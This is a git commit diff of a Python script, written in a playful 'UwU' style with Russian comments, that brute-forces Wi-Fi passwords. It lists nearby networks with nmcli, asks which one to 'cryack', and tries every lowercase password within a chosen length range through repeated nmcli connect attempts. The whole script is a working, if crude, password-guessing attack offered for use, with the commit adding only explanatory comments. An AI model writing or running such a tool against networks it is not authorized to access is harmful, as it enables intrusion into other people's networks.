c55409f78df19e1e4ae148e4710e90264f1a1942
ecco <lobachev.arseniy@gmail.com>
2024-12-26 22:19:25 +0500

    Еще комментарии для Кирюши :3

--- main.py
+++ main.py
@@ -4,6 +4,7 @@ import time
 import subprocess
 import sys
 
+# Думаю тут понятно
 animation_duration = 3 
 end_time = time.time() + animation_duration
 
@@ -15,22 +16,24 @@ while time.time() < end_time:
 
 sys.stdout.write('\rLOwOding complete!    \n')
 
-subprocess.run(['nmcli', 'device', 'wifi'])
+subprocess.run(['nmcli', 'device', 'wifi']) # Отображает доступные сети
 network = input("Which netUwUrk to cryack? (Enter full netUwUrk name): ")
 
-charset = string.ascii_lowercase
-min_length = int(input("MiNYAmal passUwUrd lenght? (Enter int valUwUe): "))
+charset = string.ascii_lowercase # Начинает перебирать пароли. Перебирает только строчные буквы
+min_length = int(input("MiNYAmal passUwUrd lenght? (Enter int valUwUe): ")) 
 max_length = int(input("Max passUwUrd lenght? (Enter int valUwUe): "))
 
-for length in range(min_length, max_length + 1):
+for length in range(min_length, max_length + 1): 
     for guess in itertools.product(charset, repeat=length):
         guess_password = ''.join(guess)
         print(f'Tryaing passUwUrd... {guess_password}')
         
-        result = subprocess.run(['nmcli', 'device', 'wifi', 'connect', network, 'password', guess_password], 
+        result = subprocess.run(['nmcli', 'device', 'wifi', 'connect', network, 'password', guess_password], # Пытается подключится к сети сгенерерованым паролем 
                                 text=True, capture_output=True)
 
-      #  Тут тоже надо переписать, ес чё. Лучше проверять через nmcli device status. А еще лучше проверять через чето другое, но я глупость-глупая >w<
+
+       # Как выяснилось лучше проверять через nmcli device status
+        # А еще лучше проверять через чето другое, но я глупость-глупая >w<
         if "successfully" in result.stdout:
             print(f'PassUwUrd was foUwUnd: {guess_password}! ^~^')
             break
